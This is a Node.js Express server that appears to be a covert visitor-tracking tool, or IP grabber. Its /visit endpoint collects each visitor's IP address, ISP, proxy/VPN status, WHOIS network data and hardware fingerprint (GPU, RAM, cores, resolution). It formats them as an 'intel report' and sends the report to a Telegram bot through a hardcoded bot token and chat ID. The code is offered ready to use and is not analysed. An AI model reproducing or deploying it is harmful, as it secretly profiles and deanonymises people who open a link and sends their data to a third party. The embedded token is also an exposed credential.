const express = require("express");
const path = require("path");
const app = express();

app.use(express.json());
// هذا السطر هو المسؤول عن إظهار الصور الموجودة في المجلد
app.use(express.static(__dirname)); 

const TELEGRAM_BOT_TOKEN = "8099317271:AAGndvsVqk9qNnzitfLhqp8UenEzlxxBA8Y";
const TELEGRAM_CHAT_ID = "8059402181";

async function getWhois(ip) {
  try {
    const res = await fetch(`https://rdap.arin.net/registry/ip/${ip}`);
    const data = await res.json();
    return {
      org: data.entities?.[0]?.vcardArray?.[1]?.find(v => v[0] === "fn")?.[3] || "N/A",
      cidr: data.cidr0_cidrs?.[0]?.v4prefix + "/" + data.cidr0_cidrs?.[0]?.length,
      handle: `${data.startAddress} - ${data.endAddress}`,
      network: data.name
    };
  } catch(e) { return null; }
}

app.post("/visit", async (req, res) => {
  try {
    const client = req.body;
    const ip = req.headers["x-forwarded-for"]?.split(",")[0] || req.socket.remoteAddress;
    const ua = req.headers["user-agent"] || "";

    const geoRes = await fetch(`http://ip-api.com/json/${ip}?fields=16777215`);
    const geo = await geoRes.json();
    const whois = await getWhois(ip);

    const report = `
<b>🚀 FULL VISITOR INTEL REPORT (100% CAPTURE)</b>
-----------------------------------------
<b>🌐 IP & ISP DATA</b>
• <b>IP Address:</b> <code>${ip}</code>
• <b>ISP:</b> ${geo.isp}
• <b>Proxy/VPN:</b> ${geo.proxy ? "Detected ⚠️" : "No"}

<b>📡 WHOIS / NETWORK</b>
• <b>Org:</b> ${whois?.org || geo.org}
• <b>CIDR:</b> ${whois?.cidr || "N/A"}
• <b>Handle:</b> ${whois?.handle || "N/A"}

<b>💻 HARDWARE</b>
• <b>GPU:</b> <code>${client.gpu || "N/A"}</code>
• <b>RAM:</b> ~${client.ram || "N/A"} GB
• <b>Cores:</b> ${client.cores || "N/A"}
• <b>Resolution:</b> ${client.res || "N/A"}

<b>📱 DEVICE</b>
• <b>Type:</b> ${/mobile/i.test(ua) ? "Mobile" : "Desktop"}

<b>⏰ LOGGED AT:</b> ${new Date().toUTCString()}
-----------------------------------------
`;

    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: report, parse_mode: "HTML" })
    });

    res.json({ success: true });
  } catch (e) { res.status(500).send(); }
});

app.get("/", (req, res) => res.sendFile(path.join(__dirname, "index.html")));
app.listen(3000);
